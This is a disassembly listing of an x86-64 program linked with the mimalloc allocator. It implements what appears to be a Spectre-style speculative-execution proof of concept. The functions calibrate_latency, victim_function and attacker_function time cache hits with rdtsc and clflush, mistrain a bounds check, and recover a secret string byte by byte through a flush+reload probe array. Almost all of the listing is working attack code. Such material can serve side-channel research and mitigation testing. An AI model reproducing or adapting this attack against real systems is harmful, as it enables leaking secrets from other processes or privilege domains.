  4013e1:	55                   	push   %rbp
  4013e2:	48 89 e5             	mov    %rsp,%rbp
  4013e5:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
  4013e9:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
  4013f0:	00 
  4013f1:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
  4013f8:	00 
  4013f9:	48 c7 45 e0 e8 03 00 	movq   $0x3e8,-0x20(%rbp)
  401400:	00 
  401401:	bf 08 00 00 00       	mov    $0x8,%edi
  401406:	e8 c5 0f 00 00       	callq  4023d0 <mi_malloc>
  40140b:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
  40140f:	48 83 7d d8 00       	cmpq   $0x0,-0x28(%rbp)
  401414:	75 19                	jne    40142f <calibrate_latency+0x4e>
  401416:	b9 80 b9 41 00       	mov    $0x41b980,%ecx
  40141b:	ba 79 00 00 00       	mov    $0x79,%edx
  401420:	be 82 b8 41 00       	mov    $0x41b882,%esi
  401425:	bf 91 b8 41 00       	mov    $0x41b891,%edi
  40142a:	e8 11 fa ff ff       	callq  400e40 <__assert_fail@plt>
  40142f:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  401433:	8a 00                	mov    (%rax),%al
  401435:	88 45 d7             	mov    %al,-0x29(%rbp)
  401438:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
  40143f:	eb 48                	jmp    401489 <calibrate_latency+0xa8>
  401441:	0f ae f0             	mfence 
  401444:	0f ae e8             	lfence 
  401447:	0f 31                	rdtsc  
  401449:	48 c1 e2 20          	shl    $0x20,%rdx
  40144d:	48 09 d0             	or     %rdx,%rax
  401450:	0f ae e8             	lfence 
  401453:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
  401457:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  40145b:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
  40145f:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  401463:	8a 00                	mov    (%rax),%al
  401465:	88 45 bf             	mov    %al,-0x41(%rbp)
  401468:	0f 01 f9             	rdtscp 
  40146b:	48 c1 e2 20          	shl    $0x20,%rdx
  40146f:	48 09 d0             	or     %rdx,%rax
  401472:	0f ae e8             	lfence 
  401475:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
  401479:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  40147d:	48 2b 45 c0          	sub    -0x40(%rbp),%rax
  401481:	48 01 45 f8          	add    %rax,-0x8(%rbp)
  401485:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
  401489:	8b 45 ec             	mov    -0x14(%rbp),%eax
  40148c:	48 39 45 e0          	cmp    %rax,-0x20(%rbp)
  401490:	77 af                	ja     401441 <calibrate_latency+0x60>
  401492:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  401496:	ba 00 00 00 00       	mov    $0x0,%edx
  40149b:	48 f7 75 e0          	divq   -0x20(%rbp)
  40149f:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  4014a3:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
  4014aa:	eb 57                	jmp    401503 <calibrate_latency+0x122>
  4014ac:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  4014b0:	48 89 45 80          	mov    %rax,-0x80(%rbp)
  4014b4:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  4014b8:	0f ae 38             	clflush (%rax)
  4014bb:	0f ae f0             	mfence 
  4014be:	0f ae e8             	lfence 
  4014c1:	0f 31                	rdtsc  
  4014c3:	48 c1 e2 20          	shl    $0x20,%rdx
  4014c7:	48 09 d0             	or     %rdx,%rax
  4014ca:	0f ae e8             	lfence 
  4014cd:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
  4014d1:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  4014d5:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
  4014d9:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  4014dd:	8a 00                	mov    (%rax),%al
  4014df:	88 45 9f             	mov    %al,-0x61(%rbp)
  4014e2:	0f 01 f9             	rdtscp 
  4014e5:	48 c1 e2 20          	shl    $0x20,%rdx
  4014e9:	48 09 d0             	or     %rdx,%rax
  4014ec:	0f ae e8             	lfence 
  4014ef:	48 89 45 90          	mov    %rax,-0x70(%rbp)
  4014f3:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  4014f7:	48 2b 45 a0          	sub    -0x60(%rbp),%rax
  4014fb:	48 01 45 f0          	add    %rax,-0x10(%rbp)
  4014ff:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
  401503:	8b 45 e8             	mov    -0x18(%rbp),%eax
  401506:	48 39 45 e0          	cmp    %rax,-0x20(%rbp)
  40150a:	77 a0                	ja     4014ac <calibrate_latency+0xcb>
  40150c:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  401510:	ba 00 00 00 00       	mov    $0x0,%edx
  401515:	48 f7 75 e0          	divq   -0x20(%rbp)
  401519:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  40151d:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  401521:	48 8d 14 00          	lea    (%rax,%rax,1),%rdx
  401525:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  401529:	48 01 d0             	add    %rdx,%rax
  40152c:	48 ba ab aa aa aa aa 	movabs $0xaaaaaaaaaaaaaaab,%rdx
  401533:	aa aa aa 
  401536:	48 f7 e2             	mul    %rdx
  401539:	48 89 d0             	mov    %rdx,%rax
  40153c:	48 d1 e8             	shr    %rax
  40153f:	48 89 45 88          	mov    %rax,-0x78(%rbp)
  401543:	48 8b 4d 88          	mov    -0x78(%rbp),%rcx
  401547:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
  40154b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40154f:	48 89 c6             	mov    %rax,%rsi
  401552:	bf 98 b8 41 00       	mov    $0x41b898,%edi
  401557:	b8 00 00 00 00       	mov    $0x0,%eax
  40155c:	e8 af f8 ff ff       	callq  400e10 <printf@plt>
  401561:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  401565:	48 89 c7             	mov    %rax,%rdi
  401568:	e8 f3 06 00 00       	callq  401c60 <mi_free>
  40156d:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  401571:	c9                   	leaveq 
  401572:	c3                   	retq   

0000000000401573 <victim_function>:
  401573:	55                   	push   %rbp
  401574:	48 89 e5             	mov    %rsp,%rbp
  401577:	48 83 ec 30          	sub    $0x30,%rsp
  40157b:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
  40157f:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
  401583:	89 55 dc             	mov    %edx,-0x24(%rbp)
  401586:	89 4d d8             	mov    %ecx,-0x28(%rbp)
  401589:	44 89 45 d4          	mov    %r8d,-0x2c(%rbp)
  40158d:	8b 55 d4             	mov    -0x2c(%rbp),%edx
  401590:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  401594:	48 8b 00             	mov    (%rax),%rax
  401597:	48 89 d6             	mov    %rdx,%rsi
  40159a:	48 89 c7             	mov    %rax,%rdi
  40159d:	e8 7e 17 00 00       	callq  402d20 <mi_realloc>
  4015a2:	48 89 c2             	mov    %rax,%rdx
  4015a5:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  4015a9:	48 89 10             	mov    %rdx,(%rax)
  4015ac:	8b 55 d4             	mov    -0x2c(%rbp),%edx
  4015af:	8b 45 dc             	mov    -0x24(%rbp),%eax
  4015b2:	48 89 d6             	mov    %rdx,%rsi
  4015b5:	48 89 c7             	mov    %rax,%rdi
  4015b8:	e8 19 fb ff ff       	callq  4010d6 <array_index_mask_nospec>
  4015bd:	21 45 dc             	and    %eax,-0x24(%rbp)
  4015c0:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  4015c4:	48 8b 10             	mov    (%rax),%rdx
  4015c7:	8b 45 dc             	mov    -0x24(%rbp),%eax
  4015ca:	48 01 d0             	add    %rdx,%rax
  4015cd:	0f b6 00             	movzbl (%rax),%eax
  4015d0:	88 45 ff             	mov    %al,-0x1(%rbp)
  4015d3:	0f b6 45 ff          	movzbl -0x1(%rbp),%eax
  4015d7:	0f af 45 d8          	imul   -0x28(%rbp),%eax
  4015db:	89 c2                	mov    %eax,%edx
  4015dd:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  4015e1:	48 01 d0             	add    %rdx,%rax
  4015e4:	8a 00                	mov    (%rax),%al
  4015e6:	88 45 fe             	mov    %al,-0x2(%rbp)
  4015e9:	b8 00 00 00 00       	mov    $0x0,%eax
  4015ee:	c9                   	leaveq 
  4015ef:	c3                   	retq   

00000000004015f0 <attacker_function>:
  4015f0:	55                   	push   %rbp
  4015f1:	48 89 e5             	mov    %rsp,%rbp
  4015f4:	48 81 ec f0 08 00 00 	sub    $0x8f0,%rsp
  4015fb:	bf d7 b8 41 00       	mov    $0x41b8d7,%edi
  401600:	e8 cb f7 ff ff       	callq  400dd0 <puts@plt>
  401605:	b8 00 00 00 00       	mov    $0x0,%eax
  40160a:	e8 45 fb ff ff       	callq  401154 <array_init>
  40160f:	48 89 85 30 ff ff ff 	mov    %rax,-0xd0(%rbp)
  401616:	b8 00 00 00 00       	mov    $0x0,%eax
  40161b:	e8 d7 fa ff ff       	callq  4010f7 <secret_init>
  401620:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
  401624:	41 b9 00 00 00 00    	mov    $0x0,%r9d
  40162a:	41 b8 ff ff ff ff    	mov    $0xffffffff,%r8d
  401630:	b9 22 00 00 00       	mov    $0x22,%ecx
  401635:	ba 03 00 00 00       	mov    $0x3,%edx
  40163a:	be 00 00 10 00       	mov    $0x100000,%esi
  40163f:	bf 00 00 00 00       	mov    $0x0,%edi
  401644:	e8 b7 f7 ff ff       	callq  400e00 <mmap@plt>
  401649:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
  40164d:	48 83 7d c8 ff       	cmpq   $0xffffffffffffffff,-0x38(%rbp)
  401652:	75 0f                	jne    401663 <attacker_function+0x73>
  401654:	bf e3 b8 41 00       	mov    $0x41b8e3,%edi
  401659:	e8 c2 f8 ff ff       	callq  400f20 <perror@plt>
  40165e:	e9 6e 04 00 00       	jmpq   401ad1 <attacker_function+0x4e1>
  401663:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  401667:	ba 00 00 10 00       	mov    $0x100000,%edx
  40166c:	be 01 00 00 00       	mov    $0x1,%esi
  401671:	48 89 c7             	mov    %rax,%rdi
  401674:	e8 e7 f7 ff ff       	callq  400e60 <memset@plt>
  401679:	b8 00 00 00 00       	mov    $0x0,%eax
  40167e:	e8 5e fd ff ff       	callq  4013e1 <calibrate_latency>
  401683:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
  401687:	bf e8 b8 41 00       	mov    $0x41b8e8,%edi
  40168c:	e8 3f f7 ff ff       	callq  400dd0 <puts@plt>
  401691:	48 8d 95 30 f7 ff ff 	lea    -0x8d0(%rbp),%rdx
  401698:	b8 00 00 00 00       	mov    $0x0,%eax
  40169d:	b9 00 01 00 00       	mov    $0x100,%ecx
  4016a2:	48 89 d7             	mov    %rdx,%rdi
  4016a5:	f3 48 ab             	rep stos %rax,%es:(%rdi)
  4016a8:	48 c7 85 10 f7 ff ff 	movq   $0x0,-0x8f0(%rbp)
  4016af:	00 00 00 00 
  4016b3:	48 c7 85 18 f7 ff ff 	movq   $0x0,-0x8e8(%rbp)
  4016ba:	00 00 00 00 
  4016be:	66 c7 85 20 f7 ff ff 	movw   $0x0,-0x8e0(%rbp)
  4016c5:	00 00 
  4016c7:	c6 85 22 f7 ff ff 00 	movb   $0x0,-0x8de(%rbp)
  4016ce:	48 8b 85 30 ff ff ff 	mov    -0xd0(%rbp),%rax
  4016d5:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
  4016d9:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
  4016dd:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  4016e1:	48 29 c2             	sub    %rax,%rdx
  4016e4:	48 89 d0             	mov    %rdx,%rax
  4016e7:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
  4016eb:	48 8b 55 b8          	mov    -0x48(%rbp),%rdx
  4016ef:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  4016f3:	48 89 c6             	mov    %rax,%rsi
  4016f6:	bf 18 b9 41 00       	mov    $0x41b918,%edi
  4016fb:	b8 00 00 00 00       	mov    $0x0,%eax
  401700:	e8 0b f7 ff ff       	callq  400e10 <printf@plt>
  401705:	48 8b 4d b0          	mov    -0x50(%rbp),%rcx
  401709:	48 8b 55 b8          	mov    -0x48(%rbp),%rdx
  40170d:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  401711:	48 89 c6             	mov    %rax,%rsi
  401714:	bf 40 b9 41 00       	mov    $0x41b940,%edi
  401719:	b8 00 00 00 00       	mov    $0x0,%eax
  40171e:	e8 ed f6 ff ff       	callq  400e10 <printf@plt>
  401723:	bf e8 b8 41 00       	mov    $0x41b8e8,%edi
  401728:	e8 a3 f6 ff ff       	callq  400dd0 <puts@plt>
  40172d:	8b 05 11 3a 22 00    	mov    0x223a11(%rip),%eax        # 625144 <array_size>
  401733:	83 e8 01             	sub    $0x1,%eax
  401736:	89 c0                	mov    %eax,%eax
  401738:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
  40173c:	8b 05 02 3a 22 00    	mov    0x223a02(%rip),%eax        # 625144 <array_size>
  401742:	d1 e8                	shr    %eax
  401744:	89 c0                	mov    %eax,%eax
  401746:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
  40174a:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  40174e:	48 83 c0 01          	add    $0x1,%rax
  401752:	48 89 45 98          	mov    %rax,-0x68(%rbp)
  401756:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  40175a:	48 89 c7             	mov    %rax,%rdi
  40175d:	e8 6e 0c 00 00       	callq  4023d0 <mi_malloc>
  401762:	48 89 45 90          	mov    %rax,-0x70(%rbp)
  401766:	b8 00 00 00 00       	mov    $0x0,%eax
  40176b:	e8 70 fa ff ff       	callq  4011e0 <random_char>
  401770:	88 45 ff             	mov    %al,-0x1(%rbp)
  401773:	0f be 45 ff          	movsbl -0x1(%rbp),%eax
  401777:	48 8b 55 b0          	mov    -0x50(%rbp),%rdx
  40177b:	89 d6                	mov    %edx,%esi
  40177d:	48 8b 55 98          	mov    -0x68(%rbp),%rdx
  401781:	89 d7                	mov    %edx,%edi
  401783:	48 8b 55 90          	mov    -0x70(%rbp),%rdx
  401787:	48 89 d1             	mov    %rdx,%rcx
  40178a:	89 c2                	mov    %eax,%edx
  40178c:	e8 16 fa ff ff       	callq  4011a7 <otherArray_init>
  401791:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  401795:	48 89 c7             	mov    %rax,%rdi
  401798:	e8 c3 04 00 00       	callq  401c60 <mi_free>
  40179d:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
  4017a4:	00 
  4017a5:	e9 c4 02 00 00       	jmpq   401a6e <attacker_function+0x47e>
  4017aa:	48 c7 45 e8 00 00 00 	movq   $0x0,-0x18(%rbp)
  4017b1:	00 
  4017b2:	e9 68 02 00 00       	jmpq   401a1f <attacker_function+0x42f>
  4017b7:	48 8b 85 30 ff ff ff 	mov    -0xd0(%rbp),%rax
  4017be:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
  4017c2:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
  4017c6:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  4017ca:	48 29 c2             	sub    %rax,%rdx
  4017cd:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  4017d1:	48 01 d0             	add    %rdx,%rax
  4017d4:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
  4017d8:	8b 05 66 39 22 00    	mov    0x223966(%rip),%eax        # 625144 <array_size>
  4017de:	83 e8 01             	sub    $0x1,%eax
  4017e1:	89 c0                	mov    %eax,%eax
  4017e3:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
  4017e7:	8b 05 57 39 22 00    	mov    0x223957(%rip),%eax        # 625144 <array_size>
  4017ed:	d1 e8                	shr    %eax
  4017ef:	89 c0                	mov    %eax,%eax
  4017f1:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
  4017f5:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  4017f9:	48 83 c0 01          	add    $0x1,%rax
  4017fd:	48 89 45 98          	mov    %rax,-0x68(%rbp)
  401801:	48 c7 45 e0 00 00 00 	movq   $0x0,-0x20(%rbp)
  401808:	00 
  401809:	e9 c2 00 00 00       	jmpq   4018d0 <attacker_function+0x2e0>
  40180e:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  401812:	83 e0 3f             	and    $0x3f,%eax
  401815:	48 83 f8 3f          	cmp    $0x3f,%rax
  401819:	0f 94 c0             	sete   %al
  40181c:	88 45 8f             	mov    %al,-0x71(%rbp)
  40181f:	0f b6 55 8f          	movzbl -0x71(%rbp),%edx
  401823:	48 8b 4d a8          	mov    -0x58(%rbp),%rcx
  401827:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  40182b:	48 89 ce             	mov    %rcx,%rsi
  40182e:	48 89 c7             	mov    %rax,%rdi
  401831:	e8 e6 f9 ff ff       	callq  40121c <csel>
  401836:	48 89 45 80          	mov    %rax,-0x80(%rbp)
  40183a:	0f b6 55 8f          	movzbl -0x71(%rbp),%edx
  40183e:	48 8b 4d a0          	mov    -0x60(%rbp),%rcx
  401842:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  401846:	48 89 ce             	mov    %rcx,%rsi
  401849:	48 89 c7             	mov    %rax,%rdi
  40184c:	e8 cb f9 ff ff       	callq  40121c <csel>
  401851:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  401858:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  40185c:	ba 00 01 00 00       	mov    $0x100,%edx
  401861:	be 00 10 00 00       	mov    $0x1000,%esi
  401866:	48 89 c7             	mov    %rax,%rdi
  401869:	e8 e8 f9 ff ff       	callq  401256 <flush_lines>
  40186e:	48 c7 85 38 ff ff ff 	movq   $0x625144,-0xc8(%rbp)
  401875:	44 51 62 00 
  401879:	48 8b 85 38 ff ff ff 	mov    -0xc8(%rbp),%rax
  401880:	0f ae 38             	clflush (%rax)
  401883:	0f ae f0             	mfence 
  401886:	0f ae e8             	lfence 
  401889:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  40188d:	89 c1                	mov    %eax,%ecx
  40188f:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  401896:	89 c2                	mov    %eax,%edx
  401898:	48 8b 75 c8          	mov    -0x38(%rbp),%rsi
  40189c:	48 8d 85 30 ff ff ff 	lea    -0xd0(%rbp),%rax
  4018a3:	41 89 c8             	mov    %ecx,%r8d
  4018a6:	b9 00 10 00 00       	mov    $0x1000,%ecx
  4018ab:	48 89 c7             	mov    %rax,%rdi
  4018ae:	e8 c0 fc ff ff       	callq  401573 <victim_function>
  4018b3:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  4018ba:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4018c1:	48 31 c0             	xor    %rax,%rax
  4018c4:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  4018cb:	48 83 45 e0 01       	addq   $0x1,-0x20(%rbp)
  4018d0:	48 83 7d e0 3f       	cmpq   $0x3f,-0x20(%rbp)
  4018d5:	0f 86 33 ff ff ff    	jbe    40180e <attacker_function+0x21e>
  4018db:	48 c7 45 d8 00 00 00 	movq   $0x0,-0x28(%rbp)
  4018e2:	00 
  4018e3:	e9 d6 00 00 00       	jmpq   4019be <attacker_function+0x3ce>
  4018e8:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  4018ec:	48 69 c0 a7 00 00 00 	imul   $0xa7,%rax,%rax
  4018f3:	48 83 c0 0d          	add    $0xd,%rax
  4018f7:	25 ff 00 00 00       	and    $0xff,%eax
  4018fc:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  401903:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  40190a:	48 c1 e0 0c          	shl    $0xc,%rax
  40190e:	48 89 c2             	mov    %rax,%rdx
  401911:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  401915:	48 01 d0             	add    %rdx,%rax
  401918:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  40191f:	0f b6 45 ff          	movzbl -0x1(%rbp),%eax
  401923:	0f b6 c0             	movzbl %al,%eax
  401926:	48 39 85 68 ff ff ff 	cmp    %rax,-0x98(%rbp)
  40192d:	0f 84 86 00 00 00    	je     4019b9 <attacker_function+0x3c9>
  401933:	0f ae f0             	mfence 
  401936:	0f ae e8             	lfence 
  401939:	0f 31                	rdtsc  
  40193b:	48 c1 e2 20          	shl    $0x20,%rdx
  40193f:	48 09 d0             	or     %rdx,%rax
  401942:	0f ae e8             	lfence 
  401945:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  40194c:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  401953:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  40195a:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  401961:	8a 00                	mov    (%rax),%al
  401963:	88 85 4f ff ff ff    	mov    %al,-0xb1(%rbp)
  401969:	0f 01 f9             	rdtscp 
  40196c:	48 c1 e2 20          	shl    $0x20,%rdx
  401970:	48 09 d0             	or     %rdx,%rax
  401973:	0f ae e8             	lfence 
  401976:	48 89 85 40 ff ff ff 	mov    %rax,-0xc0(%rbp)
  40197d:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  401984:	48 2b 85 50 ff ff ff 	sub    -0xb0(%rbp),%rax
  40198b:	48 3b 45 c0          	cmp    -0x40(%rbp),%rax
  40198f:	0f 96 c0             	setbe  %al
  401992:	0f b6 c8             	movzbl %al,%ecx
  401995:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  40199c:	48 8b 94 c5 30 f7 ff 	mov    -0x8d0(%rbp,%rax,8),%rdx
  4019a3:	ff 
  4019a4:	48 63 c1             	movslq %ecx,%rax
  4019a7:	48 01 c2             	add    %rax,%rdx
  4019aa:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4019b1:	48 89 94 c5 30 f7 ff 	mov    %rdx,-0x8d0(%rbp,%rax,8)
  4019b8:	ff 
  4019b9:	48 83 45 d8 01       	addq   $0x1,-0x28(%rbp)
  4019be:	48 81 7d d8 ff 00 00 	cmpq   $0xff,-0x28(%rbp)
  4019c5:	00 
  4019c6:	0f 86 1c ff ff ff    	jbe    4018e8 <attacker_function+0x2f8>
  4019cc:	48 8b 95 30 ff ff ff 	mov    -0xd0(%rbp),%rdx
  4019d3:	0f be 45 ff          	movsbl -0x1(%rbp),%eax
  4019d7:	48 8b 4d b0          	mov    -0x50(%rbp),%rcx
  4019db:	89 ce                	mov    %ecx,%esi
  4019dd:	48 8b 4d 98          	mov    -0x68(%rbp),%rcx
  4019e1:	89 cf                	mov    %ecx,%edi
  4019e3:	48 89 d1             	mov    %rdx,%rcx
  4019e6:	89 c2                	mov    %eax,%edx
  4019e8:	e8 ba f7 ff ff       	callq  4011a7 <otherArray_init>
  4019ed:	48 8b 85 30 ff ff ff 	mov    -0xd0(%rbp),%rax
  4019f4:	48 89 c7             	mov    %rax,%rdi
  4019f7:	e8 64 02 00 00       	callq  401c60 <mi_free>
  4019fc:	b8 00 00 00 00       	mov    $0x0,%eax
  401a01:	e8 4e f7 ff ff       	callq  401154 <array_init>
  401a06:	48 89 85 30 ff ff ff 	mov    %rax,-0xd0(%rbp)
  401a0d:	b8 00 00 00 00       	mov    $0x0,%eax
  401a12:	e8 c9 f7 ff ff       	callq  4011e0 <random_char>
  401a17:	88 45 ff             	mov    %al,-0x1(%rbp)
  401a1a:	48 83 45 e8 01       	addq   $0x1,-0x18(%rbp)
  401a1f:	48 83 7d e8 63       	cmpq   $0x63,-0x18(%rbp)
  401a24:	0f 86 8d fd ff ff    	jbe    4017b7 <attacker_function+0x1c7>
  401a2a:	48 8d 95 10 f7 ff ff 	lea    -0x8f0(%rbp),%rdx
  401a31:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  401a35:	48 8d 0c 02          	lea    (%rdx,%rax,1),%rcx
  401a39:	48 8d 85 30 f7 ff ff 	lea    -0x8d0(%rbp),%rax
  401a40:	ba 00 01 00 00       	mov    $0x100,%edx
  401a45:	48 89 c6             	mov    %rax,%rsi
  401a48:	48 89 cf             	mov    %rcx,%rdi
  401a4b:	e8 50 f8 ff ff       	callq  4012a0 <decode_flush_reload_state>
  401a50:	48 8d 85 30 f7 ff ff 	lea    -0x8d0(%rbp),%rax
  401a57:	ba 00 08 00 00       	mov    $0x800,%edx
  401a5c:	be 00 00 00 00       	mov    $0x0,%esi
  401a61:	48 89 c7             	mov    %rax,%rdi
  401a64:	e8 f7 f3 ff ff       	callq  400e60 <memset@plt>
  401a69:	48 83 45 f0 01       	addq   $0x1,-0x10(%rbp)
  401a6e:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  401a72:	48 89 c7             	mov    %rax,%rdi
  401a75:	e8 76 f3 ff ff       	callq  400df0 <strlen@plt>
  401a7a:	48 39 45 f0          	cmp    %rax,-0x10(%rbp)
  401a7e:	73 0b                	jae    401a8b <attacker_function+0x49b>
  401a80:	48 83 7d f0 12       	cmpq   $0x12,-0x10(%rbp)
  401a85:	0f 86 1f fd ff ff    	jbe    4017aa <attacker_function+0x1ba>
  401a8b:	48 8d 85 10 f7 ff ff 	lea    -0x8f0(%rbp),%rax
  401a92:	48 89 c6             	mov    %rax,%rsi
  401a95:	bf 63 b9 41 00       	mov    $0x41b963,%edi
  401a9a:	b8 00 00 00 00       	mov    $0x0,%eax
  401a9f:	e8 6c f3 ff ff       	callq  400e10 <printf@plt>
  401aa4:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  401aa8:	be 00 00 10 00       	mov    $0x100000,%esi
  401aad:	48 89 c7             	mov    %rax,%rdi
  401ab0:	e8 1b f4 ff ff       	callq  400ed0 <munmap@plt>
  401ab5:	48 8b 85 30 ff ff ff 	mov    -0xd0(%rbp),%rax
  401abc:	48 89 c7             	mov    %rax,%rdi
  401abf:	e8 9c 01 00 00       	callq  401c60 <mi_free>
  401ac4:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  401ac8:	48 89 c7             	mov    %rax,%rdi
  401acb:	e8 90 01 00 00       	callq  401c60 <mi_free>
  401ad0:	90                   	nop
  401ad1:	c9                   	leaveq 
  401ad2:	c3                   	retq   

0000000000401ad3 <main>:
  401ad3:	55                   	push   %rbp
  401ad4:	48 89 e5             	mov    %rsp,%rbp
  401ad7:	b8 00 00 00 00       	mov    $0x0,%eax
  401adc:	e8 0f fb ff ff       	callq  4015f0 <attacker_function>
  401ae1:	b8 00 00 00 00       	mov    $0x0,%eax
  401ae6:	5d                   	pop    %rbp
  401ae7:	c3                   	retq   
  401ae8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  401aef:	00 

0000000000401af0 <mi_page_usable_aligned_size_of>:
  401af0:	0f b6 4f 22          	movzbl 0x22(%rdi),%ecx
  401af4:	48 2b 77 30          	sub    0x30(%rdi),%rsi
  401af8:	48 8b 7f 28          	mov    0x28(%rdi),%rdi
  401afc:	84 c9                	test   %cl,%cl
  401afe:	74 20                	je     401b20 <mi_page_usable_aligned_size_of+0x30>
  401b00:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
  401b07:	48 d3 e2             	shl    %cl,%rdx
  401b0a:	48 f7 d2             	not    %rdx
  401b0d:	48 21 f2             	and    %rsi,%rdx
  401b10:	48 89 f8             	mov    %rdi,%rax
  401b13:	48 29 d0             	sub    %rdx,%rax
  401b16:	c3                   	retq   
  401b17:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  401b1e:	00 00 
  401b20:	48 89 f0             	mov    %rsi,%rax
  401b23:	31 d2                	xor    %edx,%edx
  401b25:	48 f7 f7             	div    %rdi
  401b28:	eb e6                	jmp    401b10 <mi_page_usable_aligned_size_of+0x20>
  401b2a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000401b30 <mi_free_block_delayed_mt>:
  401b30:	48 8b 47 38          	mov    0x38(%rdi),%rax
  401b34:	48 8d 4f 38          	lea    0x38(%rdi),%rcx
  401b38:	49 89 c0             	mov    %rax,%r8
  401b3b:	89 c2                	mov    %eax,%edx
  401b3d:	49 83 e0 fc          	and    $0xfffffffffffffffc,%r8
  401b41:	83 e2 03             	and    $0x3,%edx
  401b44:	74 1a                	je     401b60 <mi_free_block_delayed_mt+0x30>
  401b46:	89 d2                	mov    %edx,%edx
  401b48:	4c 89 06             	mov    %r8,(%rsi)
  401b4b:	48 09 f2             	or     %rsi,%rdx
  401b4e:	f0 48 0f b1 11       	lock cmpxchg %rdx,(%rcx)
  401b53:	75 e3                	jne    401b38 <mi_free_block_delayed_mt+0x8>
  401b55:	c3                   	retq   
  401b56:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  401b5d:	00 00 00 
  401b60:	49 83 c8 01          	or     $0x1,%r8
  401b64:	f0 4c 0f b1 01       	lock cmpxchg %r8,(%rcx)
  401b69:	75 cd                	jne    401b38 <mi_free_block_delayed_mt+0x8>
